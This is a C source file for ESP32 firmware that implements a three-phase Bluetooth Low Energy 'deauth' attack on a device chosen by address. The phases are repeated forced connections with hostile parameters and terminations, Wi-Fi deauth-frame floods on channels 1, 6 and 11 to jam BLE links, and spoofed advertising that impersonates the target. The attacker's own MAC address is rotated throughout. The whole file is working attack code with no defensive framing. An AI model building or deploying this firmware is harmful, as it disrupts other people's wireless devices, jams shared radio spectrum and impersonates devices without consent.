/*
 * ble_deauth.c - BLE Deauth Attack Implementation
 *
 * Force-disconnects target's active BLE connections using a
 * three-phase attack strategy.
 *
 * Thread safety:
 *   - `running` is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - `cfg` is protected by mutex
 *   - `timeout_fired` is volatile for cross-task visibility
 *
 * Async flow:
 *   The GAP event callback NEVER calls vTaskDelay (which would block
 *   the entire NimBLE host task).  Instead it updates counters and
 *   gives `conn_done_sem` to wake the deauth task, which then applies
 *   the appropriate delay before the next attempt.
 *
 * Three-phase attack:
 *   Phase 1: Direct connect → hostile params → terminate with error codes
 *   Phase 2: WiFi 802.11 RF jam on ch 1/6/11 to break BLE connection
 *   Phase 3: Spoof advertise as target to intercept reconnection
 *
 * WiFi RF jam theory:
 *   WiFi channels 1, 6, 11 overlap with BLE data channels:
 *     WiFi Ch 1  (2412 MHz) → BLE data ch 4-8
 *     WiFi Ch 6  (2437 MHz) → BLE data ch 13-17
 *     WiFi Ch 11 (2462 MHz) → BLE data ch 26-30
 *   BLE uses adaptive frequency hopping; if enough channels are
 *   corrupted, the link can't maintain itself → supervision timeout.
 *
 * Dependencies:
 *   - ble_common.h  (nimble_port_init + own_addr_type helper)
 *   - NimBLE stack  (host + controller)
 *   - esp_wifi      (802.11 raw TX for Phase 2)
 *   - FreeRTOS
 *   - cJSON
 *   - esp_timer
 */

#include "ble_deauth.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "cJSON.h"
#include <string.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"

/* WiFi headers — for RF jam (Phase 2) */
#include "esp_wifi.h"

#include "ble_common.h"

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ble_deauth";

#define DEFAULT_TIMEOUT_SEC          300
#define DEFAULT_CONNECT_TIMEOUT_MS   3000
#define DEFAULT_JAM_THRESHOLD        3
#define DEFAULT_WIFI_JAM_ROUNDS      3
#define DEFAULT_SPOOF_DURATION_SEC   5
#define DEFAULT_POST_DISCONNECT_MS   200
#define DEFAULT_FAIL_BACKOFF_MS      2000
#define DEFAULT_ADDR_TYPE            BLE_DEAUTH_ADDR_AUTO
#define DEFAULT_ROTATE_OWN_MAC       true
#define STOP_SEM_TIMEOUT_MS          5000
#define CONN_DONE_TIMEOUT_MS         10000
#define TASK_STACK_SIZE              5120
#define TASK_PRIORITY                5

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running           = false;
static SemaphoreHandle_t mutex         = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t conn_done_sem = NULL;
static TaskHandle_t task_handle        = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired      = false;

/* Timing */
static volatile int64_t start_time_ms  = 0;

/* Counters (atomic on 32-bit Xtensa) */
static volatile uint32_t connect_count  = 0;   /* successful connections   */
static volatile uint32_t deauth_count   = 0;   /* successful deauths       */
static volatile uint32_t jam_count      = 0;   /* WiFi jam rounds executed  */
static volatile uint32_t spoof_count    = 0;   /* spoof phases executed     */
static volatile uint32_t fail_count     = 0;   /* failed connect attempts   */

/* Phase tracking */
static volatile int32_t current_phase   = 1;
static volatile uint32_t status13_count = 0;
static volatile uint8_t active_addr_type = BLE_ADDR_PUBLIC;

/* Configuration */
static ble_deauth_config_t cfg = {
    .target_addr        = "",
    .timeout_sec        = DEFAULT_TIMEOUT_SEC,
    .connect_timeout_ms = DEFAULT_CONNECT_TIMEOUT_MS,
    .jam_threshold      = DEFAULT_JAM_THRESHOLD,
    .wifi_jam_rounds    = DEFAULT_WIFI_JAM_ROUNDS,
    .spoof_duration_sec = DEFAULT_SPOOF_DURATION_SEC,
    .post_disconnect_ms = DEFAULT_POST_DISCONNECT_MS,
    .fail_backoff_ms    = DEFAULT_FAIL_BACKOFF_MS,
    .addr_type          = DEFAULT_ADDR_TYPE,
    .rotate_own_mac     = DEFAULT_ROTATE_OWN_MAC,
};

/* Hostile connection parameter update — stresses the target */
static const struct ble_gap_upd_params hostile_upd_params = {
    .itvl_min = 0x0006,         /* 7.5 ms — extremely fast              */
    .itvl_max = 0x0006,         /* No flexibility                       */
    .latency = 499,             /* Skip 499 events → massive backlog    */
    .supervision_timeout = 0x000A,  /* 100 ms — very easy to timeout    */
    .min_ce_len = 0,
    .max_ce_len = 0,
};

/* Normal connection parameters */
static const struct ble_gap_conn_params conn_params = {
    .scan_itvl = 0x0010,
    .scan_window = 0x0010,
    .itvl_min = 0x0006,
    .itvl_max = 0x000C,
    .latency = 0,
    .supervision_timeout = 0x0064,
    .min_ce_len = 0,
    .max_ce_len = 0,
};

/* ================================================================== */
/*  Forward declarations                                               */
/* ================================================================== */

static void deauth_task(void *arg);
static void timeout_cb(void *arg);
static int deauth_event_cb(struct ble_gap_event *event, void *arg);
static int spoof_event_cb(struct ble_gap_event *event, void *arg);
static void run_phase1_connect(void);
static void run_phase2_jam(void);
static void run_phase3_spoof(void);

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

static int64_t now_ms(void)
{
    return (int64_t)esp_timer_get_time() / 1000;
}

static void set_random_mac(void)
{
    uint8_t rnd_addr[6];
    esp_fill_random(rnd_addr, sizeof(rnd_addr));
    rnd_addr[0] |= 0xC0;   /* Random static address: two LSBs = 11 */
    int rc = ble_hs_id_set_rnd(rnd_addr);
    if (rc != 0) {
        ESP_LOGD(TAG, "ble_hs_id_set_rnd failed: %d", rc);
    }
}

static void addr_from_str(const char *s, uint8_t out[6])
{
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

static const char *addr_type_str(ble_deauth_addr_type_t t)
{
    switch (t) {
        case BLE_DEAUTH_ADDR_PUBLIC: return "PUBLIC";
        case BLE_DEAUTH_ADDR_RANDOM: return "RANDOM";
        case BLE_DEAUTH_ADDR_AUTO:   return "AUTO";
        default:                     return "UNKNOWN";
    }
}

static const char *phase_str(int p)
{
    switch (p) {
        case 1: return "Direct Connect";
        case 2: return "WiFi RF Jam";
        case 3: return "Address Spoof";
        default: return "Unknown";
    }
}

/* Clean up all BLE state before each attempt */
static void cleanup_ble_state(void)
{
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;

        if (ble_gap_conn_active()) ble_gap_conn_cancel();
        if (ble_gap_adv_active())  ble_gap_adv_stop();
        if (ble_gap_disc_active()) ble_gap_disc_cancel();
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(100));
}

/* ================================================================== */
/*  Timeout timer                                                      */
/* ================================================================== */

static void timeout_cb(void *arg)
{
    (void)arg;
    timeout_fired = true;
    running       = false;
    ESP_LOGW(TAG, "Timeout expired — stopping BLE deauth");
}

/* ================================================================== */
/*  GAP event callback — Phase 1 & 2                                   */
/* ================================================================== */

static int deauth_event_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT: {
        if (event->connect.status == 0) {
            connect_count++;
            status13_count = 0;
            uint16_t conn_handle = event->connect.conn_handle;
            ESP_LOGI(TAG, "Connected! handle=%d (#%u)",
                     conn_handle, (unsigned)connect_count);

            /* Send hostile connection parameter update */
            int rc = ble_gap_update_params(conn_handle, &hostile_upd_params);
            if (rc != 0) {
                ESP_LOGD(TAG, "Conn update failed: %d", rc);
            }

            /* Terminate with cycling error codes */
            uint8_t error_codes[] = {
                BLE_ERR_REM_USER_CONN_TERM,   /* 0x13 */
                0x3B,                          /* Unacceptable conn params (ext) */
                BLE_ERR_UNSPECIFIED,           /* 0x1F */
                BLE_ERR_UNSUPP_REM_FEATURE,    /* 0x1A */
            };
            uint8_t err_code = error_codes[connect_count % 4];

            rc = ble_gap_terminate(conn_handle, err_code);
            if (rc != 0) {
                ESP_LOGD(TAG, "Terminate failed: %d", rc);
            } else {
                deauth_count++;
                ESP_LOGI(TAG, "Deauth sent! Error code 0x%02X (total=%u)",
                         err_code, (unsigned)deauth_count);
            }
        } else {
            fail_count++;
            ESP_LOGW(TAG, "Connect failed: status=%d", event->connect.status);

            if (event->connect.status == 13) {
                status13_count++;

                /* AUTO mode: toggle address type */
                if (cfg.addr_type == BLE_DEAUTH_ADDR_AUTO) {
                    active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                        ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
                }

                /* Check if we should switch to Phase 2 */
                if (status13_count >= cfg.jam_threshold && current_phase == 1) {
                    current_phase = 2;
                    ESP_LOGI(TAG, "Target not advertising → switching to Phase 2 (WiFi RF Jam)");
                }
            }
        }

        if (conn_done_sem) xSemaphoreGive(conn_done_sem);
        return 0;
    }

    case BLE_GAP_EVENT_DISCONNECT: {
        ESP_LOGI(TAG, "Disconnected (reason=%d)", event->disconnect.reason);
        if (conn_done_sem) xSemaphoreGive(conn_done_sem);
        return 0;
    }

    case BLE_GAP_EVENT_CONN_UPDATE:
        ESP_LOGD(TAG, "Conn update result: status=%d", event->conn_update.status);
        return 0;

    default:
        return 0;
    }
}

/* ================================================================== */
/*  GAP event callback — Phase 3 (spoof)                               */
/* ================================================================== */

static int spoof_event_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            connect_count++;
            uint16_t conn_handle = event->connect.conn_handle;
            ESP_LOGI(TAG, "SPOOF: Phone connected! handle=%d (#%u)",
                     conn_handle, (unsigned)connect_count);

            ble_gap_update_params(conn_handle, &hostile_upd_params);

            uint8_t error_codes[] = {
                BLE_ERR_REM_USER_CONN_TERM, 0x3B,
                BLE_ERR_UNSPECIFIED, BLE_ERR_UNSUPP_REM_FEATURE,
            };
            int rc = ble_gap_terminate(conn_handle, error_codes[connect_count % 4]);
            if (rc == 0) {
                deauth_count++;
            }
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "SPOOF: Disconnected (reason=%d)", event->disconnect.reason);
        break;

    default:
        break;
    }
    return 0;
}

/* ================================================================== */
/*  Phase 1: Direct Connect                                            */
/* ================================================================== */

static void run_phase1_connect(void)
{
    cleanup_ble_state();

    /* Rotate own MAC if configured */
    if (cfg.rotate_own_mac) {
        set_random_mac();
    }

    /* Determine address type */
    uint8_t use_addr_type = BLE_ADDR_PUBLIC;
    if (cfg.addr_type == BLE_DEAUTH_ADDR_RANDOM) {
        use_addr_type = BLE_ADDR_RANDOM;
    } else if (cfg.addr_type == BLE_DEAUTH_ADDR_AUTO) {
        use_addr_type = active_addr_type;
    }

    /* Parse target address */
    uint8_t addr_val[6];
    addr_from_str(cfg.target_addr, addr_val);

    ble_addr_t peer;
    peer.type = use_addr_type;
    memcpy(peer.val, addr_val, 6);

    ESP_LOGI(TAG, "PHASE 1: Connect to %s (addr_type=%s, #%u)",
             cfg.target_addr,
             use_addr_type == BLE_ADDR_RANDOM ? "RANDOM" : "PUBLIC",
             (unsigned)(connect_count + 1));

    xSemaphoreTake(conn_done_sem, 0);

    uint8_t own_addr_type = ble_common_own_addr_type();

    int rc = ble_gap_connect(own_addr_type, &peer,
                             cfg.connect_timeout_ms,
                             &conn_params, deauth_event_cb, NULL);
    if (rc != 0) {
        if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
            ESP_LOGD(TAG, "BLE busy (%d), cleaning up", rc);
            ble_gap_conn_cancel();
            vTaskDelay(pdMS_TO_TICKS(500));
        } else {
            ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
        return;
    }

    /* Wait for connection callback */
    if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(cfg.connect_timeout_ms + 2000)) != pdTRUE) {
        ESP_LOGW(TAG, "Connection timed out");
        if (ble_gap_conn_active()) ble_gap_conn_cancel();
    }

    /* After successful connect+terminate, wait for re-advertise */
    if (connect_count > 0 && status13_count == 0) {
        vTaskDelay(pdMS_TO_TICKS(cfg.post_disconnect_ms));
    }
}

/* ================================================================== */
/*  Phase 2: WiFi RF Jam                                               */
/* ================================================================== */

static void run_phase2_jam(void)
{
    jam_count++;
    ESP_LOGI(TAG, "========================================");
    ESP_LOGI(TAG, "PHASE 2: WiFi RF Jam (round #%u)", (unsigned)jam_count);
    ESP_LOGI(TAG, "Transmitting on WiFi ch 1/6/11 to disrupt BLE");
    ESP_LOGI(TAG, "(Covers BLE data channels 4-8, 13-17, 26-30)");
    ESP_LOGI(TAG, "========================================");

    /* Save current WiFi channel */
    uint8_t orig_ch = 1;
    wifi_second_chan_t orig_second = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&orig_ch, &orig_second);
    ESP_LOGI(TAG, "Current WiFi channel: %d (will restore)", orig_ch);

    /* Build a broadcast deauth frame — creates maximum RF energy */
    uint8_t ap_mac[6] = {0};
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);

    uint8_t jam_frame[26];
    jam_frame[0]  = 0xC0; jam_frame[1]  = 0x00;  /* Type: Deauth */
    jam_frame[2]  = 0x00; jam_frame[3]  = 0x00;  /* Duration */
    jam_frame[4]  = 0xFF; jam_frame[5]  = 0xFF;  /* DA: broadcast */
    jam_frame[6]  = 0xFF; jam_frame[7]  = 0xFF;
    jam_frame[8]  = 0xFF; jam_frame[9]  = 0xFF;
    memcpy(&jam_frame[10], ap_mac, 6);            /* SA: our MAC */
    memcpy(&jam_frame[16], ap_mac, 6);            /* BSSID: our MAC */
    jam_frame[22] = 0x00; jam_frame[23] = 0x00;  /* Seq number */
    jam_frame[24] = 0x01; jam_frame[25] = 0x00;  /* Reason */

    int wifi_channels[] = {1, 6, 11};
    int frames_per_burst = 200;

    for (uint32_t r = 0; r < cfg.wifi_jam_rounds && running; r++) {
        ESP_LOGI(TAG, "WiFi jam round %u/%u",
                 (unsigned)(r + 1), (unsigned)cfg.wifi_jam_rounds);

        for (int c = 0; c < 3 && running; c++) {
            esp_err_t ret = esp_wifi_set_channel(wifi_channels[c],
                                                  WIFI_SECOND_CHAN_NONE);
            if (ret != ESP_OK) {
                ESP_LOGD(TAG, "Set WiFi ch %d failed: %s",
                         wifi_channels[c], esp_err_to_name(ret));
                continue;
            }
            vTaskDelay(pdMS_TO_TICKS(30));

            int sent = 0;
            for (int i = 0; i < frames_per_burst && running; i++) {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, jam_frame,
                                        sizeof(jam_frame), true);
                if (ret == ESP_OK) sent++;
            }
            ESP_LOGI(TAG, "  WiFi ch %d: sent %d/%d frames",
                     wifi_channels[c], sent, frames_per_burst);
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }

    /* Restore original WiFi channel */
    esp_wifi_set_channel(orig_ch, orig_second);
    ESP_LOGI(TAG, "WiFi channel restored to %d", orig_ch);

    /* Wait for BLE supervision timeout (typically 2-20 seconds) */
    ESP_LOGI(TAG, "Waiting 5s for BLE supervision timeout...");
    int wait_ms = 0;
    while (running && wait_ms < 5000) {
        vTaskDelay(pdMS_TO_TICKS(500));
        wait_ms += 500;
    }

    /* Check if target is now advertising (connection dropped) */
    cleanup_ble_state();

    uint8_t addr_val[6];
    addr_from_str(cfg.target_addr, addr_val);
    uint8_t own_addr_type = ble_common_own_addr_type();

    for (int attempt = 0; attempt < 2 && running; attempt++) {
        ble_addr_t peer;
        peer.type = (attempt == 0) ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
        memcpy(peer.val, addr_val, 6);

        xSemaphoreTake(conn_done_sem, 0);

        ESP_LOGI(TAG, "Checking if target advertising (addr_type=%s)...",
                 peer.type == BLE_ADDR_PUBLIC ? "PUBLIC" : "RANDOM");

        int rc = ble_gap_connect(own_addr_type, &peer, 3000,
                                 &conn_params, deauth_event_cb, NULL);
        if (rc == 0) {
            if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(4000)) != pdTRUE) {
                if (ble_gap_conn_active()) ble_gap_conn_cancel();
            }

            if (status13_count == 0) {
                ESP_LOGI(TAG, "WiFi jam SUCCESS — target advertising! Back to Phase 1.");
                current_phase = 1;
                status13_count = 0;
                return;
            }
        } else if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
            ble_gap_conn_cancel();
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }

    /* WiFi jam didn't break the connection — try Phase 3 */
    ESP_LOGI(TAG, "WiFi jam didn't break connection. Trying Phase 3: Spoof.");
    current_phase = 3;
    run_phase3_spoof();

    /* After spoof, go back to Phase 1 */
    current_phase = 1;
    status13_count = 0;
    active_addr_type = BLE_ADDR_PUBLIC;
}

/* ================================================================== */
/*  Phase 3: Address Spoof                                             */
/* ================================================================== */

static void run_phase3_spoof(void)
{
    spoof_count++;
    ESP_LOGI(TAG, "PHASE 3: Spoof advertise as target for %us (round #%u)",
             (unsigned)cfg.spoof_duration_sec, (unsigned)spoof_count);

    cleanup_ble_state();

    uint8_t target_addr[6];
    addr_from_str(cfg.target_addr, target_addr);

    /* Set random address to look like target */
    uint8_t spoof_addr[6];
    memcpy(spoof_addr, target_addr, 6);
    spoof_addr[5] = (spoof_addr[5] & 0x3F) | 0xC0;  /* Random static */

    int rc = ble_hs_id_set_rnd(spoof_addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "Failed to set random addr (rc=%d)", rc);
    }

    /* Build advertisement data */
    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,                       /* Flags */
        0x03, 0x03, 0x0F, 0x18,                 /* Battery Service UUID */
        0x05, 0x09, 'B', 'L', 'E', 'D', 'v',    /* Name: "BLEDv" */
    };

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x0020,   /* Fast: 20ms */
        .itvl_max = 0x0030,   /* 30ms */
        .channel_map = 0x07,
        .filter_policy = 0,
    };

    ble_gap_adv_set_data(adv_data, sizeof(adv_data));
    rc = ble_gap_adv_start(1, NULL, BLE_HS_FOREVER,
                           &adv_params, spoof_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Spoof adv start failed: %d", rc);
        return;
    }

    ESP_LOGI(TAG, "Spoof advertising started! Waiting for phone...");

    /* Wait for spoof duration */
    int elapsed = 0;
    while (running && elapsed < (int)(cfg.spoof_duration_sec * 10)) {
        vTaskDelay(pdMS_TO_TICKS(100));
        elapsed++;
    }

    if (ble_gap_adv_active()) ble_gap_adv_stop();

    ESP_LOGI(TAG, "Spoof phase done.");
}

/* ================================================================== */
/*  Main task                                                          */
/* ================================================================== */

static void deauth_task(void *arg)
{
    (void)arg;

    ESP_LOGI(TAG, "Deauth task started (target=%s, timeout=%us, phases=1+2+3)",
             cfg.target_addr, (unsigned)cfg.timeout_sec);

    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(1000));

    start_time_ms = now_ms();

    while (running) {

        if (current_phase == 1) {
            run_phase1_connect();

            if (status13_count > 0) {
                /* Exponential-ish backoff on repeated failures */
                uint32_t backoff = status13_count * 300;
                if (backoff > cfg.fail_backoff_ms) {
                    backoff = cfg.fail_backoff_ms;
                }
                vTaskDelay(pdMS_TO_TICKS(backoff));
            } else {
                vTaskDelay(pdMS_TO_TICKS(cfg.post_disconnect_ms));
            }
        } else {
            /* Phase 2 (includes Phase 3 fallback) */
            run_phase2_jam();
        }

        if (!running) break;
    }

    /* Cleanup */
    cleanup_ble_state();

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    running = false;
    ESP_LOGI(TAG, "Deauth task exiting (deauths=%u, fails=%u)",
             (unsigned)deauth_count, (unsigned)fail_count);

    if (task_exit_sem) {
        xSemaphoreGive(task_exit_sem);
    }

    task_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API — Lifecycle                                             */
/* ================================================================== */

void ble_deauth_init(void)
{
    ble_common_init();

    mutex         = xSemaphoreCreateMutex();
    conn_done_sem = xSemaphoreCreateBinary();
    task_exit_sem = xSemaphoreCreateBinary();

    /* Create one-shot timeout timer */
    esp_timer_create_args_t timer_args = {
        .callback = timeout_cb,
        .name     = "ble_deauth_timeout",
    };
    esp_timer_create(&timer_args, &timeout_timer);

    ESP_LOGI(TAG, "ble_deauth initialized (3-phase: direct + WiFi jam + spoof)");
}

void ble_deauth_start(const char *target_addr)
{
    ble_deauth_config_t default_cfg = {
        .target_addr        = "",
        .timeout_sec        = DEFAULT_TIMEOUT_SEC,
        .connect_timeout_ms = DEFAULT_CONNECT_TIMEOUT_MS,
        .jam_threshold      = DEFAULT_JAM_THRESHOLD,
        .wifi_jam_rounds    = DEFAULT_WIFI_JAM_ROUNDS,
        .spoof_duration_sec = DEFAULT_SPOOF_DURATION_SEC,
        .post_disconnect_ms = DEFAULT_POST_DISCONNECT_MS,
        .fail_backoff_ms    = DEFAULT_FAIL_BACKOFF_MS,
        .addr_type          = DEFAULT_ADDR_TYPE,
        .rotate_own_mac     = DEFAULT_ROTATE_OWN_MAC,
    };
    if (target_addr) {
        strncpy(default_cfg.target_addr, target_addr,
                sizeof(default_cfg.target_addr) - 1);
    }
    ble_deauth_start_config(&default_cfg);
}

void ble_deauth_start_config(const ble_deauth_config_t *new_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running — stop first");
        return;
    }

    xSemaphoreTake(mutex, portMAX_DELAY);
    if (new_cfg) {
        cfg = *new_cfg;
    }
    cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
    xSemaphoreGive(mutex);

    /* Reset counters */
    connect_count   = 0;
    deauth_count    = 0;
    jam_count       = 0;
    spoof_count     = 0;
    fail_count      = 0;
    status13_count  = 0;
    current_phase   = 1;
    active_addr_type = BLE_ADDR_PUBLIC;
    timeout_fired   = false;

    /* Reset semaphore */
    xSemaphoreTake(conn_done_sem, 0);

    /* Start timeout timer */
    if (timeout_timer) {
        esp_timer_start_once(timeout_timer,
                             (uint64_t)cfg.timeout_sec * 1000000);
    }

    running = true;

    BaseType_t created = xTaskCreate(deauth_task, "ble_deauth",
                                     TASK_STACK_SIZE, NULL,
                                     TASK_PRIORITY, &task_handle);
    if (created != pdPASS) {
        ESP_LOGE(TAG, "Failed to create deauth task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
        }
    }
}

void ble_deauth_stop(void)
{
    if (!running) return;

    ESP_LOGI(TAG, "Stopping BLE deauth...");
    running = false;

    /* Wake task if it's blocked on the semaphore */
    if (conn_done_sem) {
        xSemaphoreGive(conn_done_sem);
    }

    /* Wait for task to exit */
    if (task_exit_sem) {
        xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS));
    }

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    task_handle = NULL;
    ESP_LOGI(TAG, "BLE deauth stopped (deauths=%u, fails=%u)",
             (unsigned)deauth_count, (unsigned)fail_count);
}

/* ================================================================== */
/*  Public API — Status getters                                        */
/* ================================================================== */

bool ble_deauth_is_running(void)
{
    return running;
}

uint32_t ble_deauth_get_connect_count(void)
{
    return connect_count;
}

uint32_t ble_deauth_get_deauth_count(void)
{
    return deauth_count;
}

uint32_t ble_deauth_get_jam_count(void)
{
    return jam_count;
}

uint32_t ble_deauth_get_spoof_count(void)
{
    return spoof_count;
}

uint32_t ble_deauth_get_fail_count(void)
{
    return fail_count;
}

int32_t ble_deauth_get_current_phase(void)
{
    return current_phase;
}

int32_t ble_deauth_get_elapsed_sec(void)
{
    if (!running && start_time_ms == 0) return 0;
    int64_t elapsed = now_ms() - start_time_ms;
    return (int32_t)(elapsed / 1000);
}

int32_t ble_deauth_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed = ble_deauth_get_elapsed_sec();
    int32_t remaining = (int32_t)cfg.timeout_sec - elapsed;
    return remaining > 0 ? remaining : 0;
}

bool ble_deauth_was_timeout(void)
{
    return timeout_fired;
}

cJSON *ble_deauth_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddStringToObject(root, "target",
                            cfg.target_addr[0] ? cfg.target_addr : "");
    cJSON_AddNumberToObject(root, "timeout_sec", cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "phase", current_phase);
    cJSON_AddStringToObject(root, "phase_str", phase_str(current_phase));
    cJSON_AddNumberToObject(root, "connect_count", connect_count);
    cJSON_AddNumberToObject(root, "deauth_count",  deauth_count);
    cJSON_AddNumberToObject(root, "jam_count",     jam_count);
    cJSON_AddNumberToObject(root, "spoof_count",   spoof_count);
    cJSON_AddNumberToObject(root, "fail_count",    fail_count);
    cJSON_AddNumberToObject(root, "status13_count", status13_count);
    cJSON_AddNumberToObject(root, "elapsed_sec",
                            ble_deauth_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",
                            ble_deauth_get_remaining_sec());
    cJSON_AddBoolToObject(root, "timeout", timeout_fired);
    cJSON_AddStringToObject(root, "addr_type", addr_type_str(cfg.addr_type));
    cJSON_AddNumberToObject(root, "jam_threshold",  cfg.jam_threshold);
    cJSON_AddNumberToObject(root, "wifi_jam_rounds", cfg.wifi_jam_rounds);
    cJSON_AddNumberToObject(root, "spoof_duration", cfg.spoof_duration_sec);
    cJSON_AddBoolToObject(root, "rotate_mac", cfg.rotate_own_mac);

    return root;
}
